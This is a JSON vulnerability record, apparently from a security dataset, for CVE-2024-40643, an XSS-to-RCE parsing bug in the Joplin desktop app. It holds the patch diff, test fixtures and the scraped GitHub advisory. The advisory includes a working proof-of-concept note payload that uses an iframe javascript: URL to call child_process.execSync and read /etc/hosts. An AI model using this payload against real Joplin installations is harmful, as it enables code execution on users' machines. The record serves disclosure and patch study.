{
    "CVE-2024-40643": {
        "published_date": "2024-09-09T14:28:20.920Z",
        "patch_commits": [
            {
                "url": "https://github.com/laurent22/joplin/commit/b220413a9b5ed55fb1f565ac786a5c231da8bc87",
                "content": "Desktop: Security: Fix HTML parsing bug (#10876)\n\nFilename: packages/app-cli/tests/md_to_html/sanitize_20.html:\n```\n@@ -0,0 +1,2 @@\n+<div class=\"jop-noMdConv\">\n+&lt;.a\n\\ No newline at end of file\n```\n\nFilename: packages/app-cli/tests/md_to_html/sanitize_20.md:\n```\n@@ -0,0 +1,2 @@\n+<div>\n+<.a<iframe src=\"http://example.com/\" >\n\\ No newline at end of file\n```\n\nFilename: packages/fork-htmlparser2/README.md:\n```\n@@ -54,6 +54,8 @@\nindex 44b4371..bcd7cc2 100644\n          if (this._cbs.onend)\n ```\n \n+To fix an HTML parsing issue (tags were allowed to start with non-alphanumeric characters), [this upstream commit](https://github.com/fb55/htmlparser2/commit/bc010de9df09f2d730a69734e05e5175ea8bd2d7) has also been applied.\n+\n * * *\n \n # htmlparser2\n```\n\nFilename: packages/fork-htmlparser2/src/Tokenizer.ts:\n```\n@@ -32,6 +32,7 @@\nconst enum State {\n     //comments\n     BeforeComment,\n     InComment,\n+    InSpecialComment,\n     AfterComment1,\n     AfterComment2,\n\n@@ -87,6 +88,10 @@\nfunction whitespace(c: string): boolean {\n     return c === \" \" || c === \"\\n\" || c === \"\\t\" || c === \"\\f\" || c === \"\\r\";\n }\n \n+function isASCIIAlpha(c: string): boolean {\n+    return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z');\n+}\n+\n interface Callbacks {\n     onattribdata(value: string): void; //TODO implement the new event\n     onattribend(): void;\n\n@@ -282,6 +287,8 @@\nexport default class Tokenizer {\n         } else if (c === \"?\") {\n             this._state = State.InProcessingInstruction;\n             this._sectionStart = this._index + 1;\n+        } else if (!isASCIIAlpha(c)) {\n+            this._state = State.Text;\n         } else {\n             this._state =\n                 !this._xmlMode && (c === \"s\" || c === \"S\")\n\n@@ -309,6 +316,9 @@\nexport default class Tokenizer {\n                 this._state = State.Text;\n                 this._index--;\n             }\n+        } else if (!isASCIIAlpha(c)) {\n+            this._state = State.InSpecialComment;\n+            this._sectionStart = this._index;\n         } else {\n             this._state = State.InClosingTagName;\n             this._sectionStart = this._index;\n\n@@ -454,6 +464,15 @@\nexport default class Tokenizer {\n     _stateInComment(c: string) {\n         if (c === \"-\") this._state = State.AfterComment1;\n     }\n+    _stateInSpecialComment(c: string) {\n+        if (c === \">\") {\n+            this._cbs.oncomment(\n+                this._buffer.substring(this._sectionStart, this._index)\n+            );\n+            this._state = State.Text;\n+            this._sectionStart = this._index + 1;\n+        }\n+    }\n     _stateAfterComment1(c: string) {\n         if (c === \"-\") {\n             this._state = State.AfterComment2;\n\n@@ -702,6 +721,8 @@\nexport default class Tokenizer {\n                 this._stateInAttributeName(c);\n             } else if (this._state === State.InComment) {\n                 this._stateInComment(c);\n+            } else if (this._state === State.InSpecialComment) {\n+                this._stateInSpecialComment(c);\n             } else if (this._state === State.BeforeAttributeName) {\n                 this._stateBeforeAttributeName(c);\n             } else if (this._state === State.InTagName) {\n```\n\nFilename: packages/fork-htmlparser2/src/__fixtures__/Events/34-not-alpha-tags.json:\n```\n@@ -0,0 +1,12 @@\n+{\n+  \"name\": \"tag names are not ASCII alpha\",\n+  \"options\": {\n+      \"parser\": {}\n+  },\n+  \"html\": \"<12>text</12>\",\n+  \"expected\": [\n+      { \"event\": \"text\", \"data\": [\"<12>text\"] },\n+      { \"event\": \"comment\", \"data\": [\"12\"] },\n+      { \"event\": \"commentend\", \"data\": [] }\n+  ]\n+}\n```"
            }
        ],
        "sw_version": "v3.0.14",
        "sw_version_wget": "https://github.com/laurent22/joplin/archive/refs/tags/v3.0.14.zip",
        "description": "Joplin is a free, open source note taking and to-do application. Joplin fails to take into account that \"<\" followed by a non letter character will not be considered html. As such it is possible to do an XSS by putting an \"illegal\" tag within a tag.",
        "sec_adv": [
            {
                "url": "https://github.com/laurent22/joplin/security/advisories/GHSA-g796-3g6g-jmmc",
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nlaurent22\n/\njoplin\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 5.3k\nStar 49.3k\nCode\nIssues\n525\nPull requests\n31\nActions\nProjects\nSecurity\n12\nInsights\nAdditional navigation options\nParsing error leading to XSS\nHigh laurent22 published GHSA-g796-3g6g-jmmc on Sep 6, 2024Sep 6, 2024\nPackage\nJoplin for Desktop\nAffected versions\n3.0.13\nPatched versions\n3.0.15\nDescription\nSummary\nThere is a parsing error that allows for arbitrary tag injection which leads to RCE.\nDetails\nJoplin fails to take into account that \"<\" followed by a non letter character will not be considered html.\nAs such it is possible to do an XSS by putting an \"illegal\" tag within a tag.\nPoC\nPaste this into any notes, the POC will read the /etc/hosts file.\n<div>\n<.a<iframe src=javascript:try{top.alert(parent.parent.require('child_process').execSync('echo\\x20$(cat\\x20/etc/hosts)'))}catch(e){top.alert(e)} >\nImpact\nThis leads to RCE\nSeverity\nHigh\n8.6\n/ 10\nCVSS v3 base metrics\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nLearn more about base metrics\nCVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H\nCVE ID\nCVE-2024-40643\nWeaknesses\nNo CWEs\nCredits\nfebou92\nReporter\nFooter\nÂ© 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory provides a proof of concept in the 'PoC' section, showcasing how the vulnerability can be exploited."
            }
        ],
        "cwe": [
            {
                "id": "CWE-79",
                "value": "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
            }
        ]
    }
}